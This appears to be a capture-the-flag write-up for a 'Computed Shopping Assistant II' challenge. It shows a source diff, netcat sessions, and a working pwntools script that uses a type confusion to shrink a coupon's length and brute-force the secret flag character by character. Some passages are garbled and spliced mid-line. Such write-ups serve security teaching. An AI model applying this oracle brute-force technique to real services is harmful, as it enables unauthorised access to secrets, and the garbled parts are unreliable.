	scanf("%c", &newline); // clear newline from buffer
	fgets(user_input, STRING_BUFFER_SIZE, stdin);
	for (int i = 0; i type == TYPE_COUPON && !item->coupon.have_entered) {
			if (!memcmp(item->coupon.code, user_input, item->coupon.length)) {
				printf("Applied coupon for %d%% OFF!\n", item->coupon.discount_amount);
				item->coupon.have_entered = true;
				return;
			}
		}
	}
	printf("Invalid coupon!\n");
}
void checkout() {
	printf("\nThank you for choosing Computed Shopping Assistant II !\n");
	printf("Your items will be delivered to you within 24 hours.\n");
	printf("Goodbye!\n");
	exit(0);
}
void main_menu() {
	printf("\n---> Welcome to Computed Shopping Assistant II 
## Solution
This is the follow-up for [Computed Shopping Assistant](Computed_Shopping_Assistant.md). Since we have the sources for the previous challenge as well, it's interesting to check the delta between them:
```console
┌──(user@kali)-[/media/sf_CTFs/checkpoint/Computed_Shopping_Assistant_II]
└─$ diff Computed_Shopping_Assistant_II/shopping_cart.h ../Computed_Shopping_Assistant/Computed_Shopping_Assistant/shopping_cart.h
11d10
coupon.discount_amount coupon.discount_amount, item->coupon.code);
coupon.discount_amount);
                                       printf("(index %d) - %d%% OFF coupon - %s\n", i, item->coupon.discount_amount, item->coupon.code);
212d207
       printf("\nThank you for choosing Computed Shopping Assistant!\n");
241c236
 Welcome to Computed Shopping Assistant II        printf("\n---> Welcome to Computed Shopping Assistant coupon.have_entered) {
					if (item->coupon.discount_amount coupon.discount_amount, item->coupon.code);
					} else { // need to be a little more discrete about special coupons
						printf("(index %d) - %d%% OFF coupon - *CENSORED*\n", i, item->coupon.discount_amount);
					}
				}
```
The program will only print the coupon if it's one of the cheaper coupons, and we already know those:
```console
┌──(user@kali)-[/media/sf_CTFs/checkpoint/Computed_Shopping_Assistant_II]
└─$  nc csa-2.csa-challenge.com 2222
---> Welcome to Computed Shopping Assistant II type == TYPE_COUPON && !item->coupon.have_entered) {
			if (!memcmp(item->coupon.code, user_input, item->coupon.length)) {
				printf("Applied coupon for %d%% OFF!\n", item->coupon.discount_amount);
				item->coupon.have_entered = true;
				return;
			}
		}
	}
	printf("Invalid coupon!\n");
}
```
To apply a coupon, the program compares the user input to the loaded coupon up to the `length` of the coupon. What will happen if we modify the `length` (a.k.a. `amount_loaves`) of the secret coupon to `1`? Well, in that case, in order for our coupon to be accepted by the program, we just need to provide an input where the first character of the coupon matches the first character of the input. So, to know what's the first character of the coupon, we just need to input all printable characters, one at a time, and see for which one the coupon is accepted. Once we have that, we proceed in the same manner to reveal the second character, and so on.
Here's an example:
```console
┌──(user@kali)-[/media/sf_CTFs/checkpoint/Computed_Shopping_Assistant_II]
└─$  nc csa-2.csa-challenge.com 2222
---> Welcome to Computed Shopping Assistant II ?[\\]^`|~ '
assert(set(ALPHABET) == set(string.ascii_lowercase + string.ascii_uppercase + string.digits + string.punctuation + ' '))
class ComputedShoppingAssistant():
    class MenuOption(Enum):
        ADD_ITEM        = 1
        EDIT_ITEM       = 2
        REMOVE_ITEM     = 3
        VIEW_CART       = 4
        APPLY_COUPON    = 5
        CHECKOUT        = 6
    class ItemProperty(Enum):
        TYPE            = 1
        KILOGRAMS       = 2
        ITEMS           = 3
        LOAVES          = 4
        LITERS          = 5
        DESCRIPTION     = 6
        INVALID         = 7
    def __init__(self, io: pwnlib.tubes.tube):
        self.io = io
    def _select_menu(self, selection: "ComputedShoppingAssistant.MenuOption") -> None:
        self.io.recvuntilS(b"What would you like to do?\r\n")
        for _ in self.MenuOption:
            self.io.recvline()
        self.io.sendline(str(selection.value).encode("ascii"))
    def apply_coupon(self, coupon: str) -> bool:
        self._select_menu(self.MenuOption.APPLY_COUPON)
        self.io.sendlineafter(b"Please enter your coupon:\r\n", coupon.encode("ascii"))
        result = self.io.recvlineS()
        return result != "Invalid coupon!\r\n"
    def edit_item(self, index: int, property: "ComputedShoppingAssistant.ItemProperty", value: Union[int, str, None]) -> bool:
        self._select_menu(self.MenuOption.EDIT_ITEM)
        self.io.sendlineafter(b"Which item index would you like to edit?\r\n", str(index).encode("ascii"))
        out = self.io.recvlineS()
        if out == "Item is a coupon!\r\n":
            return False
        assert(out == "Which property would you like to edit?\r\n")
        for _ in self.ItemProperty:
            self.io.recvline()
        self.io.sendline(str(property.value).encode("ascii"))
        self.io.sendlineafter(b": ", str(value).encode("ascii"))
        out = self.io.recvlineS()
        return out == "Item updated!\r\n"
    def view_cart(self) -> str:
        self._select_menu(self.MenuOption.VIEW_CART)
        self.io.recvuntil(b'\r\nYour shopping cart has')
        self.io.recvline()
        out = self.io.recvuntilS("\r\n\r\n".encode("ascii"))
        return out.strip().split("\r\n")
    def checkout(self) -> None:
        self._select_menu(self.MenuOption.CHECKOUT)
coupon_index = 2
flag = ""
with log.progress('Brute forcing flag...') as p:
    while True:
        with context.local(log_level='ERROR'): 
            io = start()
        csa = ComputedShoppingAssistant(io)
        csa.apply_coupon("NOT_A_FLAG{I_4M_A_N3WB1E}")
        csa.apply_coupon("CSA{iN_L1nuX_1T_W0UlDnT_H4PP3N}")
        # Will change coupon to fruit and set amount_loaves (i.e. length) to n
        csa.edit_item(coupon_index, ComputedShoppingAssistant.ItemProperty.LOAVES, len(flag) + 1)
        # Will set amount_items to 0
        csa.edit_item(coupon_index, ComputedShoppingAssistant.ItemProperty.ITEMS, 0)
        # Will change fruit to coupon
        csa.edit_item(coupon_index, ComputedShoppingAssistant.ItemProperty.ITEMS, None)
        for c in ALPHABET:
            p.status(f"Known flag: '{flag}', trying '{c}'")
            if csa.apply_coupon(flag + c):
                flag += c
                with context.local(log_level='ERROR'): 
                    io.close()
                break
        else:
            raise RuntimeError("Can't find flag")
        if flag[-1] == "}":
            break
log.info(f"Flag: {flag}")
```
Output:
```console
┌──(user@kali)-[/media/sf_CTFs/checkpoint/Computed_Shopping_Assistant_II]
└─$ python3 exploit.py
[+] Brute forcing flag...: Done
[*] Flag: CSA{Typ3_C0nFu510n_iS_a_ReAL_Pr0bL3m}
```